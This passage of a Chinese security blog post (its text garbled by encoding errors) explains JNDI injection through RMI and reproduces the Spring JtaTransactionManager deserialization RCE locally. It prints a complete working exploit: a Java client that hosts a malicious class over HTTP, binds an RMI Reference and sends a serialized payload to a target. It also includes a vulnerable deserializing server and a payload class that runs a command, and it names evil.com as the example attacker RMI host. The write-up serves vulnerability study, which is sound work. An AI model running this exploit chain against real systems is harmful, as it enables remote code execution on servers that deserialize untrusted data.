<p>JNDIï¼š<code>è·¯å¾„+åç§°:å¯¹è±¡åç§°</code><br>JNDIæ”¯æŒå¤šç§å‘½åå’Œç›®å½•æä¾›ç¨‹åºï¼ˆNaming and Directory Providersï¼‰ï¼ŒRMIæ³¨å†Œè¡¨æœåŠ¡æä¾›ç¨‹åºï¼ˆRMI Registry Service Providerï¼‰å…è®¸é€šè¿‡JNDIåº”ç”¨æ¥å£å¯¹RMIä¸­æ³¨å†Œçš„è¿œç¨‹å¯¹è±¡è¿›è¡Œè®¿é—®æ“ä½œã€‚å°†RMIæœåŠ¡ç»‘å®šåˆ°JNDIçš„ä¸€ä¸ªå¥½å¤„æ˜¯æ›´åŠ é€æ˜ã€ç»Ÿä¸€å’Œæ¾æ•£è€¦åˆï¼ŒRMIå®¢æˆ·ç«¯ç›´æ¥é€šè¿‡URLæ¥å®šä½ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ï¼Œè€Œä¸”è¯¥RMIæœåŠ¡å¯ä»¥å’ŒåŒ…å«äººå‘˜ï¼Œç»„ç»‡å’Œç½‘ç»œèµ„æºç­‰ä¿¡æ¯çš„ä¼ä¸šç›®å½•é“¾æ¥åœ¨ä¸€èµ·ã€‚</p>
</blockquote>
</li>
<li>JNDIæ¥å£åœ¨åˆå§‹åŒ–æ—¶ï¼Œå¯ä»¥å°†RMI URLä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè€ŒJNDIæ³¨å…¥å°±å‡ºç°åœ¨å®¢æˆ·ç«¯çš„lookup()å‡½æ•°ä¸­ï¼Œå¦‚æœ<code>lookup()</code>çš„å‚æ•°å¯æ§å°±å¯èƒ½è¢«æ”»å‡»ã€‚<h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2>åœ¨JNDIæœåŠ¡ä¸­ï¼ŒRMIæœåŠ¡ç«¯é™¤äº†ç›´æ¥ç»‘å®šè¿œç¨‹å¯¹è±¡ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡<code>References</code>ç±»æ¥ç»‘å®šä¸€ä¸ªå¤–éƒ¨çš„è¿œç¨‹å¯¹è±¡ï¼ˆå½“å‰åç§°ç›®å½•ç³»ç»Ÿä¹‹å¤–çš„å¯¹è±¡ï¼‰ã€‚ç»‘å®šäº†Referenceä¹‹åï¼ŒæœåŠ¡ç«¯ä¼šå…ˆé€šè¿‡Referenceable.getReference()è·å–ç»‘å®šå¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶ä¸”åœ¨ç›®å½•ä¸­ä¿å­˜ã€‚å½“å®¢æˆ·ç«¯åœ¨lookup()æŸ¥æ‰¾è¿™ä¸ªè¿œç¨‹å¯¹è±¡æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šè·å–ç›¸åº”çš„<code>object factory</code>ï¼Œæœ€ç»ˆé€šè¿‡<code>factory</code>ç±»å°†<code>reference</code>è½¬æ¢ä¸ºå…·ä½“çš„å¯¹è±¡å®ä¾‹ã€‚</li>
<li>åˆ©ç”¨æµç¨‹</li>
</ul>
<ol>
<li>ç›®æ ‡ä»£ç ä¸­è°ƒç”¨äº†InitialContext.lookup(URI)ï¼Œä¸”URIä¸ºç”¨æˆ·å¯æ§ï¼›</li>
<li>æ”»å‡»è€…æ§åˆ¶URIå‚æ•°ä¸ºæ¶æ„çš„RMIæœåŠ¡åœ°å€ï¼Œå¦‚ï¼šrmi://evil.com//nameï¼›</li>
<li>æ”»å‡»è€…RMIæœåŠ¡å™¨å‘ç›®æ ‡è¿”å›ä¸€ä¸ªReferenceå¯¹è±¡ï¼ŒReferenceå¯¹è±¡ä¸­æŒ‡å®šæŸä¸ªç²¾å¿ƒæ„é€ çš„Factoryç±»ï¼›</li>
<li>ç›®æ ‡åœ¨è¿›è¡Œlookup()æ“ä½œæ—¶ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶å®ä¾‹åŒ–Factoryç±»ï¼Œæ¥ç€è°ƒç”¨factory.getObjectInstance()è·å–å¤–éƒ¨è¿œç¨‹å¯¹è±¡å®ä¾‹ï¼›</li>
<li>æ”»å‡»è€…å¯ä»¥åœ¨Factoryç±»æ–‡ä»¶çš„æ„é€ æ–¹æ³•ã€é™æ€ä»£ç å—ã€getObjectInstance()æ–¹æ³•ç­‰å¤„å†™å…¥æ¶æ„ä»£ç ï¼Œè¾¾åˆ°RCEçš„æ•ˆæœ.<br>æ”»å‡»ç›®æ ‡æ‰®æ¼”çš„ç›¸å½“äºæ˜¯JNDIå®¢æˆ·ç«¯çš„è§’è‰²ï¼Œæ”»å‡»è€…é€šè¿‡æ­å»ºä¸€ä¸ªæ¶æ„çš„RMIæœåŠ¡ç«¯æ¥å®æ–½æ”»å‡»ã€‚</li>
</ol>
<h1 id="Spring-JNDIæ³¨å…¥ä¸ååºåˆ—åŒ–"><a href="#Spring-JNDIæ³¨å…¥ä¸ååºåˆ—åŒ–" class="headerlink" title="Spring JNDIæ³¨å…¥ä¸ååºåˆ—åŒ–"></a>Spring JNDIæ³¨å…¥ä¸ååºåˆ—åŒ–</h1><p>Springæ¡†æ¶çš„spring-tx.jarä¸­çš„JtaTransactionManager.readObject()ä¸­å°±å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå½“è¿›è¡Œå¯¹è±¡ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œlookup()æ“ä½œï¼Œå…¶ä¸­lookup()å‚æ•°å¯æ§å¯¼è‡´äº†RCEã€‚</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç¯å¢ƒä½¿ç”¨çš„æ˜¯Githubä¸Š<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">zerothoughts</a>æä¾›çš„POCï¼Œä¸»è¦åŠŸèƒ½å°±æ˜¯ä¸€ä¸ªç®€å•çš„Clientã€Serverç«¯ï¼Œè¿è¡Œåœ¨Springç¯å¢ƒä¸‹ã€‚</p>
<ul>
<li>å…¶ä¸­Serverç«¯å¼€å¯ä¸€ä¸ªSocketè¿æ¥ï¼Œè¯»å–Clientå‘é€çš„åºåˆ—åŒ–æ•°æ®ï¼Œç„¶åååºåˆ—åŒ–å¾—åˆ°å¯¹è±¡</li>
<li>Clientè´Ÿè´£å‘é€åºåˆ—åŒ–æ•°æ®ä»¥åŠå®ç°ä¸€ä¸ªJNDIæ³¨å…¥æ¥åŠ è½½æ¶æ„ç±»<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2>Springæ¡†æ¶çš„spring-tx.jarä¸­çš„JtaTransactionManager.readObject()ä¸­ï¼Œå½“è¿›è¡Œå¯¹è±¡ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œlookup()æ“ä½œè€Œä¸”å‚æ•°å¯æ§ï¼Œå¯ä»¥è¿›è¡ŒJNDIæ³¨å…¥ã€‚<h3 id="å®¢æˆ·ç«¯-1"><a href="#å®¢æˆ·ç«¯-1" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String serverAddress = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            String localAddress= args[<span class="number">2</span>];</span><br><span class="line">            <span class="comment">//å¯åŠ¨web serverï¼Œæä¾›è¿œç¨‹ä¸‹è½½è¦è°ƒç”¨ç±»çš„æ¥å£</span></span><br><span class="line">            System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">            HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8088</span>), <span class="number">0</span>);</span><br><span class="line">            httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">            httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">            httpServer.start();</span><br><span class="line">            <span class="comment">//ä¸‹è½½æ¶æ„ç±»çš„åœ°å€ http://127.0.0.1:8088/ExportObject.class</span></span><br><span class="line">            System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8088/"</span>);</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">            Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">            System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">            <span class="comment">//jndiçš„è°ƒç”¨åœ°å€</span></span><br><span class="line">            String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line">            org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">            object.setUserTransactionName(jndiAddress);</span><br><span class="line">            <span class="comment">//å‘é€payload</span></span><br><span class="line">            System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>å¯ä»¥çœ‹åˆ°å®¢æˆ·ç«¯é¦–å…ˆå¯åŠ¨ä¸€ä¸ªHTTPæœåŠ¡æ¥æä¾›JNDIå°†è¦è¿œç¨‹åŠ è½½çš„æ¶æ„ç±»</li>
<li>æ¥ä¸‹æ¥æ³¨å†Œå¹¶å¯åŠ¨RMIæœåŠ¡ï¼Œç„¶åé€šè¿‡<code>References</code>ç±» ç»‘å®š æˆ‘ä»¬HTTPæœåŠ¡æä¾›çš„æ¶æ„ç±»</li>
<li>æœ€åå°±æ˜¯RMIçš„è°ƒç”¨è¿‡ç¨‹äº†</li>
</ul>
<h3 id="æœåŠ¡ç«¯-1"><a href="#æœåŠ¡ç«¯-1" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(Integer.parseInt(<span class="string">"1111"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Server started on port "</span> + serverSocket.getLocalPort());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">//ç­‰å¾…è¿æ¥</span></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"Connection received from "</span> + socket.getInetAddress());</span><br><span class="line">                ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//è¯»å–å¯¹è±¡</span></span><br><span class="line">                    Object object = objectInputStream.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"Read object "</span> + object);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>æœåŠ¡ç«¯çš„ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªè¯»å–åºåˆ—åŒ–æ•°æ®å†è¿›è¡Œååºåˆ—åŒ–çš„è¿‡ç¨‹<blockquote>
<p>æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„payloadï¼Œç„¶åå»è®¿é—®å®¢æˆ·ç«¯RMIæœåŠ¡ï¼Œå®¢æˆ·ç«¯RMIæœåŠ¡è®¿é—®HTTPæœåŠ¡æä¾›çš„æ¶æ„ç±»ï¼Œè¯»å–æ¶æ„ç±»ç„¶åè¿”å›ç»™Serverï¼ŒServerç«¯æ¥æ”¶åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–ç„¶åè§¦å‘æˆ‘ä»¬æ„é€ çš„æ¶æ„ä»£ç é€ æˆRCE</p>
</blockquote>
</li>
</ul>
<h2 id="æœ¬åœ°å¤ç°"><a href="#æœ¬åœ°å¤ç°" class="headerlink" title="æœ¬åœ°å¤ç°"></a>æœ¬åœ°å¤ç°</h2><p>æˆ‘ä»¬é¦–å…ˆå¯åŠ¨æœåŠ¡ç«¯ï¼Œå†å¯åŠ¨å®¢æˆ·ç«¯ï¼Œ<br><img src="./ExpServer.png" alt="ExpServer"></p>
<p><img src="1.png" alt=""><br><img src="2.png" alt=""><br><img src="3.png" alt=""><br><img src="4.png" alt=""><br><img src="5.png" alt=""><br>ä»¥ä¸Šå°±æ˜¯è°ƒç”¨æ ˆäº†</p>
<ul>
<li>æ¶æ„ç±»<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String sb = <span class="string">""</span>;</span><br><span class="line">		BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">		BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">		String lineStr;</span><br><span class="line">		<span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">			sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">		inBr.close();</span><br><span class="line">		in.close();</span><br><span class="line">		<span class="keyword">return</span> sb;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String cmd=<span class="string">"calc.exe"</span>;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> Exception(exec(cmd));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
åˆ©ç”¨ JtaTransactionManager ç±»ä¸­å¯ä»¥è¢«æ§åˆ¶çš„ readObject() æ–¹æ³•ï¼Œä»è€Œæ„é€ æ¶æ„çš„è¢«åºåˆ—åŒ–ç±»ï¼Œå…¶ä¸­åˆ©ç”¨ readObject() ä¼šè§¦å‘è¿œç¨‹æ¶æ„ç±»ä¸­çš„æ„é€ å‡½æ•°è¿™ä¸€ç‚¹ï¼Œè¾¾åˆ°ç›®çš„ã€‚<br>æœ€åè´´ä¸Šç»“æœï¼š<br><img src="./result.gif" alt=""></li>
</ul>
<h1 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h1><ul>
<li><a href="https://blog.csdn.net/xinghun_4/article/details/45787549" target="_blank" rel="noopener">java RMIåŸç†è¯¦è§£</a></li>
<li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">æ·±å…¥ç†è§£JNDIæ³¨å…¥ä¸Javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</a></li>
<li><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce" target="_blank" rel="noopener">seebug-æ·±å…¥ç†è§£ JAVA ååºåˆ—åŒ–æ¼æ´</a></li>
</ul>
]]></content>
  </entry>
</search>
